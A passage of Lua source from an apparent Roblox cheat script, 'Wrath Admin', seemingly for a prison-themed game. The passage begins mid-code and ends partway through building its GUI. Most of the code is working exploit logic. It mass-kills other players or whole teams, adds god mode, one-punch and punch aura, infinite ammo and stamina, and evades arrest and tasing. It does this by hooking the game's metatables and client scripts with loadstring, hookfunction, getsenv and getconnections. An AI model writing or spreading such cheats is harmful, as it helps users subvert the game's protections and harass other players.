            local Humanoid = player.Character and player.Character:FindFirstChildOfClass("Humanoid")
            if Humanoid then
                     for _, track in ipairs(Humanoid:GetPlayingAnimationTracks()) do
                        if table.find(hostileanimationIds, track.Animation.AnimationId) then
                            pcall(function()
                                 Kill({player});
                            end);
                        end;
                     end
            end;
                    --print("Debug_KilledHostiles") 
        end
    end
end
        end
    end)
    
    if not success then
        warn("An error occurred:", error)
    end
    end;
end)

--// Team SpeedKill:
task.spawn(function()
    while task.wait(0.03) do
        local SpeedKillPlayers = {};
        if States.SpeedKillAll then
            for i,v in pairs(Players:GetPlayers()) do
                if v ~= LocalPlayer and CheckProtected(v, "killcmds") then
                    SpeedKillPlayers[#SpeedKillPlayers+1] = v;
                end;
            end;
        end;
        if States.SpeedKillInmates then
            for i,v in pairs(Teams.Inmates:GetPlayers()) do
                if v ~= LocalPlayer and CheckProtected(v, "killcmds") then
                    SpeedKillPlayers[#SpeedKillPlayers+1] = v;
                end;
            end;
        end;    
        if States.SpeedKillGuards then
            for i,v in pairs(Teams.Guards:GetPlayers()) do
                if v ~= LocalPlayer and CheckProtected(v, "killcmds") then
                    SpeedKillPlayers[#SpeedKillPlayers+1] = v;
                end;
            end;
        end;
        if States.SpeedKillCriminals then
            for i,v in pairs(Teams.Criminals:GetPlayers()) do
                if v ~= LocalPlayer and CheckProtected(v, "killcmds") then
                    SpeedKillPlayers[#SpeedKillPlayers+1] = v;
                end;
            end;
        end;
        if next(SpeedKillPlayers) then
            SpeedKill(SpeedKillPlayers);
        end;
    end;
end);

--// Reset Armor Spam Flags:
local function ResetArmorSpamFlags(PLR)
    ArmorSpamFlags[PLR.Name] = 0;
end;

for i,v in pairs(Players:GetPlayers()) do
    if v ~= LocalPlayer then
        ResetArmorSpamFlags(v);
        v.CharacterAdded:Connect(ResetArmorSpamFlags);
    end;
end;

Players.PlayerAdded:Connect(function(PLR)
    PLR.CharacterAdded:Connect(ResetArmorSpamFlags);
end);

--// Anti Punch

local function AntiPunchPlayerAdded(PLR)
    PLR.CharacterAdded:Connect(function(Char)
        if Char then
            local Humanoid = Char:WaitForChild("Humanoid", 1);
            if Humanoid then
                Humanoid.AnimationPlayed:Connect(function(AnimationTrack)
                    if States.AntiPunch and CheckProtected(PLR, "killcmds") then
                        if AnimationTrack.Animation.AnimationId == "rbxassetid://484200742" or AnimationTrack.Animation.AnimationId == "rbxassetid://484926359" or AnimationTrack.Animation.AnimationId == "rbxassetid://275012308" then
                            pcall(function()
                                local VPos = Char:FindFirstChildOfClass("Part").Position
                                local LPos = LocalPlayer.Character.HumanoidRootPart.Position
                                local Angle = math.deg(math.acos(Char.HumanoidRootPart.CFrame.LookVector.unit:Dot((LPos-VPos).unit)))
                                if Angle < 65 and (LPos-VPos).Magnitude <= 7 then
                                    for i = 1, 15 do
                                        MeleeEvent(PLR);
                                    end;
                                end;
                            end);
                        end;
                    end;
                end);
            end;
        end;
    end);
end;

for i,v in pairs(Players:GetPlayers()) do
    if v ~= LocalPlayer then
        if v.Character then
            AntiPunchPlayerAdded(v);
            local Humanoid = v.Character:FindFirstChildWhichIsA("Humanoid");
            if Humanoid then
                Humanoid.AnimationPlayed:Connect(function(AnimationTrack)
                    if States.AntiPunch and CheckProtected(v, "killcmds") then
                        if AnimationTrack.Animation.AnimationId == "rbxassetid://484200742" or AnimationTrack.Animation.AnimationId == "rbxassetid://484926359" or v.Character:FindFirstChild("Hammer") or v.Character:FindFirstChild("Crude Knife") then
                            pcall(function()
                                local VPos = v.Character:FindFirstChildOfClass("Part").Position
                                local LPos = LocalPlayer.Character.HumanoidRootPart.Position
                                local Angle = math.deg(math.acos(v.Character.HumanoidRootPart.CFrame.LookVector.unit:Dot((LPos-VPos).unit)))
                                if Angle < 50 and (LPos-VPos).Magnitude <= 7 then
                                    for i = 1, 15 do
                                        MeleeEvent(v);
                                    end;
                                end;
                            end);
                        end;
                    end;
                end);
            end;
        end;
    end;
end;

Players.PlayerAdded:Connect(AntiPunchPlayerAdded)

--// God Mode:
task.spawn(function()
    while task.wait(0.03) do
        if States.GodMode and not States.GivingKeycard then
            if LocalPlayer.Character then
                local Hum = LocalPlayer.Character:FindFirstChild("Humanoid"); 
                if Hum then
                    LoadPos();
                    local Fake = Hum:Clone();
                    Hum:Destroy();
                    Fake.Parent = LocalPlayer.Character;
                    pcall(function()
                        LocalPlayer.Character.Animate.Disabled = true;
                        LocalPlayer.Character.Animate.Disabled = false;
                        Camera.CameraSubject = CurrentlyViewing.Player.Character;
                    end);
                    LocalPlayer.CharacterRemoving:wait();
                    SavePos();
                end;
            end;
        end;
    end;
end)

--// Forcefield:
task.spawn(function()
    while rService.RenderStepped:wait() do
        if States.Forcefield then
            if LocalPlayer.Character then
                Loadchar("Really red");
                TeamEvent("Medium stone grey");
                LoadPos();
                task.wait(9);
                SavePos();
            end;
        end;
    end;
end)

--// One Punch:
UserInputService.InputBegan:Connect(function(INPUT)
    if States.OnePunch and INPUT.UserInputType == Enum.UserInputType.Keyboard and INPUT.KeyCode == Enum.KeyCode.F then
        if not States.PunchAura then
            for i,v in pairs(Players:GetPlayers()) do
                if v ~= LocalPlayer and CheckProtected(v, "killcmds") then
                    if v.Character then
                        pcall(function()
                            local VPart = v.Character.PrimaryPart;
                            local PPart = LocalPlayer.Character.PrimaryPart;
                            local Angle = math.deg(math.acos(LocalPlayer.Character.HumanoidRootPart.CFrame.LookVector.unit:Dot((VPart.Position-PPart.Position).unit)))
                            if Angle < 50 and (PPart.Position-VPart.Position).Magnitude <= 7 then
                                for i = 1, 15 do
                                    MeleeEvent(v);
                                end;
                            end;
                        end);
                    end;
                end;
            end;
        else
            local Character = ClosestCharacter(20);
            if Character then
                for i = 1, 15 do
                    MeleeEvent(Players:GetPlayerFromCharacter(Character));
                end;
            end;
        end;
    end;
end);


--// Anti Armor Spam:
task.spawn(function()
    while task.wait(0.03) do
        for i,v in pairs(Players:GetPlayers()) do
            if v.Character then
                for _,object in pairs(v.Character:GetChildren()) do
                    if object.Name == "vest" then
                        object:Destroy();
                        if not ArmorSpamFlags[v.Name] then
                            ArmorSpamFlags[v.Name] = 1;
                        else
                            ArmorSpamFlags[v.Name] = ArmorSpamFlags[v.Name] + 1;
                        end;
                    end;
                end;
            end;
        end;
    end;
end)

--// Anti Arrest Lag: (Placeholder)
--Info.Arrest = 0;
--task.spawn(function()
    --while task.wait(0.03) do
        --for i,v in pairs(Players:GetPlayers()) do
            --if v ~= LocalPlayer and v.Character then
                --local Head = v.Character:FindFirstChild("Head");
                --if Head then
                    --for _,object in pairs(Head:GetChildren()) do
                        --if object.Name == "handcuffedGui" then
                            --object:Destroy();
                        --end;
                    --end;
                --end
            --end;
        --end;
    --end;
--end)

--// Anti Void:
task.spawn(function()
    while task.wait() do
        if LocalPlayer.Character and States.AntiVoid then
            if LocalPlayer.Character.PrimaryPart then
                if LocalPlayer.Character.PrimaryPart.Position.Y < 1 then
                    Teleport(LocalPlayer, CFrame.new(888, 100, 2388));
                    pcall(function()
                        for i,v in pairs(LocalPlayer.Character:GetChildren()) do
                            if v:IsA("BasePart") then
                                v.Velocity = Vector3.new();
                            end;
                        end;
                    end)
                end;
            end;
        end;
    end;
end)

--// Inf Ammo Auto Reload:
task.spawn(function()
    while task.wait(1) do
        if next(AmmoGuns) then
            for i,v in next, AmmoGuns do
                rStorage.ReloadEvent:FireServer(v);
            end;
        end;
    end;
end)

--// Spam Punch:
task.spawn(function()
    while task.wait(0.03) do
        if States.SpamPunch and PunchFunction then
            if UserInputService:IsKeyDown(Enum.KeyCode.F) then
                coroutine.wrap(PunchFunction)();
            end;
        end;
    end;
end)

--// Anti Fling:
rService.Stepped:Connect(function()
    if States.AntiFling then
        for i,v in pairs(Players:GetPlayers()) do
            if v ~= LocalPlayer then
                if v.Character then
                    for _,object in pairs(v.Character:GetChildren()) do
                        if object:IsA("BasePart") then
                            object.CanCollide = false;
                        end;
                        if object:IsA("Accessory") then
                            pcall(function()
                                object.Handle.CanCollide = false;
                            end);
                        end;
                    end; 
                end;
            end;
        end;
    end;
end);

--// Anti Bring:
LocalPlayer.CharacterAdded:Connect(function(CHAR)
    CHAR.ChildAdded:Connect(function(ITEM)
        if States.AntiBring then
            if ITEM:IsA("Tool") then
                if not CheckWhitelisted(ITEM) then
                    pcall(function()
                        LocalPlayer.Character.Torso.Anchored = true
                        LocalPlayer.Character.Torso.Anchored = false
                    end);
                    ITEM:Destroy();
                    rService.RenderStepped:wait();
                    pcall(function()
                        ITEM:Destroy();
                    end);
                end;
            end;
        end;
    end);
end);

--// Anti Bring
for Index, ITEM in pairs(LocalPlayer.Backpack:GetChildren()) do
    if States.AntiBring then
        if ITEM:IsA("Tool") then
            if not CheckWhitelisted(ITEM) then
                ITEM:Destroy();
            end
            rService.RenderStepped:wait();
            pcall(function()
                ITEM:Destroy();
            end);
        end
    end
end

--// Anti Bring
for Index, ITEM in pairs(LocalPlayer.Character:GetChildren()) do
    if States.AntiBring then
        if ITEM:IsA("Tool") then
            if not CheckWhitelisted(ITEM) then
                ITEM:Destroy();
            end
            rService.RenderStepped:wait();
            pcall(function()
                ITEM:Destroy();
            end);
        end
    end
end


--// Anti Spam Arrest
LocalPlayer.CharacterAdded:Connect(function(CHAR)
    if not Info.StopRespawnLag then
        local ClientInputHandler = CHAR:WaitForChild("ClientInputHandler", 1);
        if ClientInputHandler then
            --YieldUntilScriptLoaded(ClientInputHandler);
            task.wait(1);
            pcall(function()
                local Senv = getsenv(ClientInputHandler);
                local OldMT = Senv.cs;
                Senv.cs = setmetatable({},{
                    __newindex = function(Table, Index, Value)
                        if Index == "isArrested" and Value == true then
                            pcall(function()
                                Loadchar("Bright blue");
                                LoadPos();
                                HasBeenArrested = true;
                            end);
                        end;
                        if Index == "isFighting" then
                            Value = false;
                        end
                        if Index == "isCrouching" then
                            Info.Crouching = Value;
                        end;
                        OldMT[Index] = Value;
                    end;
                    __index = OldMT;
                });
            end);
        end;
        --// Anti Tase:
        task.spawn(function()
            task.wait(1);
            for i,v in pairs(getconnections(workspace.Remote.tazePlayer.OnClientEvent)) do
                v:Disable();
            end;
        end);
    end;
end);

--[[local ClientInputHandler = game:GetService("StarterPlayer").StarterCharacterScripts.ClientInputHandler
if ClientInputHandler then
    --YieldUntilScriptLoaded(ClientInputHandler);
    local Senv = getsenv(ClientInputHandler);
    local OldMT = Senv.cs;
    Senv.cs = setmetatable({},{
        __newindex = function(Table, Index, Value)
            if Index == "isArrested" and Value == true then
                pcall(function()
                    LocalPlayer.Character:Destroy();
                    Loadchar("Bright blue");
                    LoadPos();
                    HasBeenArrested = true;
                end);
            end;
            if Index == "isFighting" then
                Value = false;
            end
            if Index == "isCrouching" then
                Info.Crouching = Value;
            end;
            OldMT[Index] = Value;
        end;
        __index = OldMT;
    });

    --// Anti Tase:
    task.spawn(function()
        task.wait(1);
        for i,v in pairs(getconnections(workspace.Remote.tazePlayer.OnClientEvent)) do
            v:Disable();
        end;
    end);
end;]]

task.spawn(function()
    while rService.Heartbeat:wait() do
        pcall(function()
            if LocalPlayer.Character.Head:FindFirstChild("handcuffedGui") then
                Loadchar("Bright blue");
                LoadPos();
                HasBeenArrested = true;
            end;
        end);
    end;
end)

--// Auto Anti Spam Arrest
Info.LastArrestTime = 0;
Info.LastNotifiedArrest = 0;
Info.Arrested = 0;
LocalPlayer.CharacterAdded:Connect(function(Char)
    local Head = Char:WaitForChild("Head", 1);
    if Head then
        Head.ChildAdded:Connect(function(Child)
            if Child.Name == "handcuffedGui" then
                if tick() - Info.LastArrestTime <= 0.1 then
                    Info.Arrested = Info.Arrested + 1;
                    Info.LastArrestTime = tick()
                else
                    Info.Arrested = 0;
                    Info.LastArrestTime = tick()
                end;
                if Info.Arrested >= 2 then
                    if tick() - Info.LastNotifiedArrest >= 5 then
                        Notify("Success", "Wrath Admin has detected a spam arrest exploit and turned on anti-criminal + anti-bring.", 5);
                        Info.LastNotifiedArrest = tick();
                    end;
                    ChangeGuiToggle(true, "Anti-Criminal");
                    ChangeGuiToggle(true, "Anti-Bring");
                    Loadchar("Bright blue")
                    States.AntiCriminal = true
                    States.AntiBring = true;
                    States.GodMode = true
                    States.NoClip = true
                end;
                coroutine.wrap(function()
                    task.wait()
                    --Child:Destroy()
                end)()
                --print(Info.Arrested)
            end;
        end);
    end;
end);

Info.LastRespawnTime = 0;
LocalPlayer.CharacterAdded:Connect(function(Char)
    if tick() - Info.LastRespawnTime <= 0.5 then
        Info.StopRespawnLag = true;
    else
        Info.StopRespawnLag = false;
    end;
    Info.LastRespawnTime = tick();
end)

--// Anti Crash:
task.spawn(function()
    for i,v in pairs(getconnections(rStorage:WaitForChild("ReplicateEvent").OnClientEvent)) do
        v:Enable();
    end;
end);
local KillDebounce = 0.2;
local TeleportDebounce = 0.5;
local CurrentTime = 0;
local TeleportTime = 0;

--// Get Player Hit
function GetPlayerHit(Part)
    for i,v in pairs(Players:GetPlayers()) do
        if v.Character:IsAncestorOf(Part) then
            return v;
        end;
    end;
end;

--// Combat Logs:
local function OnReplicateEvent(Args)
    --[[if States.CombatLogs then
        print("=== SHOT GUN ===");
    end;]]
    local Count = 0;
    if not States.AntiCrash then
        pcall(function()
            for i,v in next, Args do
                if Count <= 5 then
                    local Hit, Distance, Cframe, RayObject = v.Hit, v.Distance, v.Cframe, v.RayObject;
                    if Hit and Distance and Cframe then
                        if Cframe ~= CFrame.new() then
                            local PlayerHit, WhoShot = GetPlayerHit(Hit) --Players:GetPlayerFromCharacter(Hit.Parent);

                            local CalculatedCFrame = Cframe * CFrame.new(0, 0, -Distance / 2);

                            local Success, Error = pcall(function()
                                WhoShot = GetClosestPlayerToPosition(CalculatedCFrame.p)
                            end)
                            
                            local ShotWith = WhoShot.Character:FindFirstChildOfClass("Tool");

                            if Success and WhoShot then
                                local Hit, HitPosition = workspace:FindPartOnRay(RayObject, WhoShot.Character)

                                if States.CombatLogs then
                                    if PlayerHit then
                                        print("Bullet -- " .. tostring(i));
                                        print("Shot From:", WhoShot, "(" .. tostring(WhoShot.Team) .. ")");
                                        if PlayerHit then
                                            print("Hit Player:", PlayerHit, "(" .. tostring(PlayerHit.Team) .. ")");
                                        else
                                            print("Hit Part:", Hit);
                                        end;
                                        print("Shot With:", ShotWith);
                                        print("Distance:", Distance);
                                    end;
                                end;
                                if States.ShootBack then
                                    if PlayerHit then
                                        if PlayerHit == LocalPlayer then
                                            if CheckProtected(WhoShot, "killcmds") and WhoShot.TeamColor ~= LocalPlayer.TeamColor then
                                                if tick() - CurrentTime >= KillDebounce then
                                                    CurrentTime = tick();
                                                    if LocalPlayer.Character.Humanoid.Health <= 0 then
                                                        LocalPlayer.CharacterAdded:wait()
                                                    end;
                                                    Kill({WhoShot});
                                                end;
                                            end;
                                        end;
                                    end;
                                end;
                                if States.TaseBack then
                                    if PlayerHit then
                                        if PlayerHit == LocalPlayer and PlayerHit.TeamColor.Name ~= "Bright blue" then
                                            if CheckProtected(WhoShot, "killcmds") then
                                                if tick() - CurrentTime >= KillDebounce then
                                                    CurrentTime = tick();
                                                    Tase({WhoShot});
                                                end;
                                            end;
                                        end;
                                    end;
                                end;
                                if PlayerHit and WhoShot then
                                    if Oneshots[WhoShot.UserId] then
                                        if CheckProtected(PlayerHit, "killcmds") and WhoShot.TeamColor ~= PlayerHit.TeamColor then
                                            if tick() - CurrentTime >= KillDebounce then
                                                CurrentTime = tick();
                                                Kill({PlayerHit});
                                            end;
                                        end;
                                    end;
                                    if AntiShoots[PlayerHit.UserId] then
                                        if CheckProtected(WhoShot, "killcmds") and WhoShot.TeamColor ~= PlayerHit.TeamColor then
                                            if tick() - CurrentTime >= KillDebounce then
                                                CurrentTime = tick();
                                                Kill({WhoShot})
                                            end;
                                        end;
                                    end;
                                    if TaseBacks[PlayerHit.UserId] then
                                        if CheckProtected(WhoShot, "killcmds") and WhoShot.TeamColor.Name ~= "Bright blue" then
                                            if tick() - CurrentTime >= KillDebounce then
                                                CurrentTime = tick();
                                                Tase({WhoShot})
                                            end;
                                        end;
                                    end;
                                end;
                                if Hit and HitPosition and WhoShot then
                                    if ClickTeleports[WhoShot.UserId] then
                                        if tick() - CurrentTime >= TeleportDebounce then
                                            CurrentTime = tick();
                                            Teleport(WhoShot, CFrame.new(HitPosition) * CFrame.new(0, 2, 0));
                                        end;
                                    end;
                                end;
                            end;
                        end;
                    end;
                    Count = Count + 1
                end;
            end;
        end);
    end;
    --[[if States.CombatLogs then
        print("=== END ===");
    end;]]
end;

task.spawn(function()
    rStorage:WaitForChild("ReplicateEvent").OnClientEvent:Connect(OnReplicateEvent);
end);
--// Friendly Fire + Disable Gun Animations

local DebounceTime = 0;

MT.__namecall = newcclosure(loadstring([[
    local __Namecall, States, Info, Players, ClosestCharacter, LocalPlayer, MeleeEvent, DebounceTime, rStorage = ...
    return function(Self, ...)
        local Args = {...}
        local Method = getnamecallmethod();

        if States.FriendlyFire and Method == "FireServer" and tostring(Self) == "ShootEvent" then
            local ValidPlayer = Players.GetPlayerFromCharacter(Players, Args[1][1].Hit.Parent) or Players.GetPlayerFromCharacter(Players, Args[1][1].Hit);
            if ValidPlayer then
                task.spawn(function()
                    if LocalPlayer.TeamColor ~= BrickColor.new("Bright orange") and LocalPlayer.TeamColor ~= BrickColor.new("Medium stone grey") then
                        workspace.Remote.TeamEvent:FireServer("Medium stone grey");
                        task.wait(0.04);
                    if Info.FriendlyFireOldTeam == "Bright orange" or Info.FriendlyFireOldTeam == "Bright blue" then
                        workspace.Remote.TeamEvent:FireServer("Bright orange");
                    elseif Info.FriendlyFireOldTeam == "Really red" then
                        workspace.Remote.TeamEvent:FireServer("Bright orange")
                    end;
         
                    end
                end)
            end;
        end;
        if States.OneShot and Method == "FireServer" and tostring(Self) == "ShootEvent" then
            local ValidPlayer = Players.GetPlayerFromCharacter(Players, Args[1][1].Hit.Parent) or Players.GetPlayerFromCharacter(Players, Args[1][1].Hit);
            if ValidPlayer then
                if ValidPlayer.TeamColor ~= LocalPlayer.TeamColor then
                    coroutine.wrap(Kill)({ValidPlayer});
                end;
            end;
        end;
        if States.PunchAura and not Info.Crouching then
            if Method == "FindPartOnRay" and tostring(getfenv(0).script) ~= "GunInterface" and tostring(getfenv(0).script) ~= "TaserInterface" then
                if LocalPlayer.Character then
                    if LocalPlayer.Character.PrimaryPart then
                        local Character = ClosestCharacter(math.huge);
                        if Character then
                            if game.FindFirstChild(Character, "Head") then
                                return Character.Head, Character.Head.Position;
                            end;
                        end;
                    end;
                end;
            end;
        end;
        if States.LoudPunch then
            if Method == "FireServer" and tostring(Self) == "meleeEvent" then
                pcall(function()
                    for i,v in pairs(Workspace:GetChildren()) do
                        if game.Players:FindFirstChild(v.Name) then
                            s = v.Head.punchSound
                            s.Volume = math.huge
                            game:GetService("ReplicatedStorage").SoundEvent:FireServer(s)
                        end
                    end
                end)
            end;
        end
        return __Namecall(Self, unpack(Args));
    end;
]])(__Namecall, States, Info, Players, ClosestCharacter, LocalPlayer, MeleeEvent, DebounceTime, rStorage));

--// Anti Trip:
LocalPlayer.CharacterAdded:Connect(function(CHAR)
    local Humanoid = CHAR:WaitForChild("Humanoid", 1);
    if Humanoid then
        Humanoid:SetStateEnabled(Enum.HumanoidStateType.FallingDown, false);
        Humanoid:SetStateEnabled(Enum.HumanoidStateType.Ragdoll, false);
    end
end);

--// Auto Gun Mods:
LocalPlayer.CharacterAdded:Connect(function(CHAR)
    CHAR.ChildAdded:Connect(function(Tool)
        ModGun(Tool);
    end);
end);

--// Metatable Hooks:
MT.__index = newcclosure(loadstring([[
    local IndexMT = ...
    return function(Table, Index)
        if tostring(Table) == "Status" then
            if tostring(Index) == "isBadGuard" or tostring(Index) == "toolIsEquipped" then
                return false;
            end;
            if tostring(Index) == "playerCell" then
                return nil;
            end
        end;
        if tostring(Table) == "Humanoid" and Index == "PlatformStand" then
            return false;
        end;
        return IndexMT(Table, Index)
    end;
]])(IndexMT));

--// INF stamina:
MT.__newindex = newcclosure(loadstring([[
    local NewIndex = ...
    return function(Table, Index, Value)
        if tostring(Table) == "Humanoid" and Index == "Jump" and not Value then
            return
        end;

        return NewIndex(Table, Index, Value);
    end;
]])(NewIndex));

loadstring([[
    local TooltipModule = ...
    local OldUpdate = TooltipModule.update
    OldUpdate = hookfunction(TooltipModule.update, function(Message)
        if Message == "You don't have enough stamina!" then
            return
        end;
        return OldUpdate(Message)
    end);
]])(TooltipModule);

--// Anti Criminal:
--[[LocalPlayer:GetPropertyChangedSignal("Team"):Connect(function()
    if tostring(LocalPlayer.Team) ~= "Guards" and #Teams.Guards:GetPlayers() >= 8 and not States.SpamArresting and not States.Forcefield and States.AntiCriminal then
        SavePos();
        Loadchar("Bright blue")
        LoadPos();
    end;
end);]]

rService.Heartbeat:Connect(function()
    --Fix inventory
    game:GetService('StarterGui'):SetCoreGuiEnabled('Backpack', true)
    if States.AntiCriminal then
        if #Teams.Guards:GetPlayers() < 8 then
            coroutine.wrap(TeamEvent)("Bright blue")
        elseif #Teams.Guards:GetPlayers() > 8 then
            if not Info.RespawnPaused and not Info.HasDied and not Info.LoadingNeutralChar then
                coroutine.wrap(TeamEvent)("Medium stone grey")
            end;
        elseif #Teams.Guards:GetPlayers() == 8 then
            if LocalPlayer.TeamColor.Name == "Bright blue" and not Info.LoadingNeutralChar then
                coroutine.wrap(TeamEvent)("Bright blue")
            else
                if not Info.RespawnPaused and not Info.HasDied and not Info.LoadingNeutralChar then
                    coroutine.wrap(TeamEvent)("Medium stone grey")
                end;
            end;
        end;
    end;
end);

--kcf
task.spawn(function()
    while task.wait(0.03) do
        if States.Kcf then
		    workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.single["Key card"].ITEMPICKUP)
		    workspace.Prison_ITEMS.single:FindFirstChild("Key card")
        end
    end
end)            

--// Rainbow Bullets
rService.RenderStepped:Connect(function()
    if States.Rb then
        local Tool = GetTool()
        if Tool then
            local Children = Tool:GetChildren()
            table.foreach(Children, function(Key, Child)
                if (Child.Name == "RayPart") then
                    Child.Color = BrickColor.random().Color
                end
            end)
        end
    end
end)

--// Rgb
task.spawn(function()
    while task.wait(0.03) do
        if States.Rgb then
            SavePos()
            Loadchar("Carnation pink");
            LoadPos()
            wait(1)
            SavePos()
            Loadchar("Royal purple");
            LoadPos()
            wait(1)
            SavePos()
            Loadchar("Lapis");
            LoadPos()
            wait(1)
            SavePos()
            Loadchar("Cyan");
            wait(1)
            SavePos()
            Loadchar("Crimson");
            LoadPos()
            wait(1)
            SavePos()
            Loadchar("New Yeller");
            LoadPos()
            wait(1)
            SavePos()
            Loadchar(Color3.fromRGB(255, 175, 0))
            LoadPos()
        end
    end
end)

--// Command Queue
task.spawn(function()
    while task.wait(0.03) do    
        for i, Command in next, CommandQueue do
            if next(CommandQueue) then
                Command();
                table.remove(CommandQueue, i);
                task.wait(1);
            end;
        end;
    end;
end)

--// Chat Queue:
task.spawn(function()
    while task.wait(0.03) do
        for i, Chat in next, ChatQueue do
            if next(ChatQueue) then
                Chat();
                table.remove(ChatQueue, i);
                task.wait(1);
            end;
        end;
    end;
end);

--// Command Bar:
-- Gui
local WrathCommandBar = Instance.new("ScreenGui")
local Bar = Instance.new("Frame")
local StartLine = Instance.new("TextLabel")
local TextBox = Instance.new("TextBox")

WrathCommandBar.Name = "WrathCommandBar"
WrathCommandBar.Parent = game.CoreGui
WrathCommandBar.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

Bar.Name = "Bar"
Bar.Parent = WrathCommandBar
Bar.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Bar.BackgroundTransparency = 0.500
Bar.BorderSizePixel = 0
Bar.Position = UDim2.new(1.49011612e-08, 0, 0.934272289, 0)
Bar.Size = UDim2.new(1, 0, 0.0657276958, 0)

StartLine.Name = "StartLine"
StartLine.Parent = Bar
StartLine.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
StartLine.BackgroundTransparency = 1.000
StartLine.Size = UDim2.new(0.0509554148, 0, 1, 0)
StartLine.Font = Enum.Font.Code
StartLine.Text = ">"
StartLine.TextColor3 = Color3.fromRGB(255, 255, 255)
StartLine.TextScaled = true
StartLine.TextSize = 1.000
StartLine.TextWrapped = true

TextBox.Parent = Bar
TextBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextBox.BackgroundTransparency = 1.000
TextBox.BorderColor3 = Color3.fromRGB(27, 42, 53)
TextBox.Position = UDim2.new(0.0509554148, 0, 0, 0)
TextBox.Size = UDim2.new(0.949044585, 0, 1, 0)
TextBox.Font = Enum.Font.Code
TextBox.Text = ""
TextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
TextBox.TextScaled = true
TextBox.TextSize = 14.000
TextBox.TextWrapped = true
TextBox.ClearTextOnFocus = false;
TextBox.TextXAlignment = Enum.TextXAlignment.Left

Bar.Position = UDim2.new(0, 0, 1, 0);

UserInputService.InputBegan:Connect(function(INPUT, CHATTING)
    if CHATTING then
        return
    end;
    if INPUT.UserInputType == Enum.UserInputType.Keyboard and INPUT.KeyCode == Enum.KeyCode[OpenCommandBarKey] then
        TextBox.Text = ""
        Bar:TweenPosition(UDim2.new(0, 0, 0.900, 0), "Out", "Quad", 0.2, true);
        task.wait(0.03)
        TextBox:CaptureFocus();
    end;
end);

TextBox.FocusLost:Connect(function()
    Bar:TweenPosition(UDim2.new(0, 0, 1, 0), "Out", "Quad", 0.2, true);
    coroutine.wrap(UseCommand)(Settings.Prefix .. TextBox.Text)
    task.wait(1/5);
    TextBox.Text = "";
end)

--// GUI
local function makeDraggable(obj) 
    --// Original code by Tiffblocks, edited so that it has a cool tween to it. 
    local gui = obj
    
    local dragging
    local dragInput
    local dragStart
    local startPos
    
    local function update(input)
        local delta = input.Position - dragStart
        local EndPos = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        local Tween = TweenService:Create(
            gui, 
            TweenInfo.new(0.2), 
            {Position = EndPos}
        )
        Tween:Play()
    end
    
    gui.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            dragStart = input.Position
            startPos = gui.Position
            
            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then
                    dragging = false
                end
            end)
        end
    end)
    
    gui.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
            dragInput = input
        end
    end)
    
    UserInputService.InputChanged:Connect(function(input)
        if input == dragInput and dragging then
            update(input)
        end
    end)
end


-------------------------- :::COMMAND GUI::: -------------------------------

-------------------------- :::COMMAND GUI::: -------------------------------

-------------------------- :::COMMAND GUI::: -------------------------------

-------------------------- :::COMMAND GUI::: -------------------------------
-- Instances:

local MainGuiObjects = {
    WrathAdminGuiMain = Instance.new("ScreenGui");
    Stats = Instance.new("Frame");
    TemplateTopbar = Instance.new("Frame");
    TemplateTopbarRound = Instance.new("UICorner");
    TemplateTitle = Instance.new("TextLabel");
    PlayerListRound = Instance.new("UICorner");
    StatesListFrame = Instance.new("ScrollingFrame");
    UIListLayout = Instance.new("UIListLayout");
    Stat = Instance.new("TextButton");
    UICorner = Instance.new("UICorner");
    TextLabel = Instance.new("TextLabel");
    Stat_2 = Instance.new("TextButton");
    UICorner_2 = Instance.new("UICorner");
    TextLabel_2 = Instance.new("TextLabel");
    Stat_3 = Instance.new("TextButton");
    UICorner_3 = Instance.new("UICorner");
    TextLabel_3 = Instance.new("TextLabel");
    GetPlayers = Instance.new("Frame");
    TemplateTopbar_2 = Instance.new("Frame");
    TemplateTopbarRound_2 = Instance.new("UICorner");
    TemplateTitle_2 = Instance.new("TextLabel");
    PlayerListRound_2 = Instance.new("UICorner");
    GetPlayersContent = Instance.new("ScrollingFrame");
    TextButton = Instance.new("TextButton");
    UICorner_4 = Instance.new("UICorner");
    TextButton_2 = Instance.new("TextButton");
    UICorner_5 = Instance.new("UICorner");
    TextButton_3 = Instance.new("TextButton");
    UICorner_6 = Instance.new("UICorner");
    TextButton_4 = Instance.new("TextButton");
    UICorner_7 = Instance.new("UICorner");
    TextButton_5 = Instance.new("TextButton");
    UICorner_8 = Instance.new("UICorner");
    TextButton_6 = Instance.new("TextButton");
    UICorner_9 = Instance.new("UICorner");
    TextButton_7 = Instance.new("TextButton");
    UICorner_10 = Instance.new("UICorner");
    TextButton_8 = Instance.new("TextButton");
    UICorner_11 = Instance.new("UICorner");
    UIListLayout_2 = Instance.new("UIListLayout");
    TextButton_9 = Instance.new("TextButton");
    UICorner_12 = Instance.new("UICorner");
    PlayerList = Instance.new("Frame");
    ListTopbar = Instance.new("Frame");
    ListTopbarRound = Instance.new("UICorner");
    ListTitle = Instance.new("TextLabel");
    PlayerListFrame = Instance.new("ScrollingFrame");
    UIListLayout_3 = Instance.new("UIListLayout");
    TextButton_10 = Instance.new("TextButton");
    UICorner_13 = Instance.new("UICorner");
    PlayerListRound_3 = Instance.new("UICorner");
    Toggles = Instance.new("Frame");
    TogglesTopbar = Instance.new("Frame");
    TemplateTopbarRound_3 = Instance.new("UICorner");
    TogglesTitle = Instance.new("TextLabel");
    PlayerListRound_4 = Instance.new("UICorner");
    TogglesListFrame = Instance.new("ScrollingFrame");
    UIListLayout_4 = Instance.new("UIListLayout");
    Toggle = Instance.new("TextButton");
    UICorner_14 = Instance.new("UICorner");
    TextLabel_4 = Instance.new("TextLabel");
    Toggle_2 = Instance.new("TextButton");
    UICorner_15 = Instance.new("UICorner");
    TextLabel_5 = Instance.new("TextLabel");
    Toggle_3 = Instance.new("TextButton");
    UICorner_16 = Instance.new("UICorner");
    TextLabel_6 = Instance.new("TextLabel");
